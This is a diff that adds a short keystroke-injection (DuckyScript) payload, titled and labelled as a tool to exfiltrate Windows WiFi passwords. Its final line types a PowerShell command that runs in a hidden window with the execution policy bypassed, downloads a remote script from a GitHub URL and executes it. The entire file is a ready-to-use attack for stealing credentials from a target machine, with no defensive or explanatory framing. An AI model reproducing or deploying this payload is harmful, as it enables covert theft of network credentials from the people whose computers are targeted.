@@ -1,0 +1,14 @@
+REM ###########################################################
+REM #                                                         |
+REM # Title        : Exfiltrate Windows WiFi Passwords        |
+REM # Author       : Zenin                                    |
+REM # Version      : 1.0                                      |
+REM # Category     : Credentials, Exfiltrate                  |
+REM # Target       : Windows                                  |
+REM #                                                         |
+REM ###########################################################
+
+DELAY 2000
+GUI r
+DELAY 250
+STRINGLN  powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Exfilaration/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
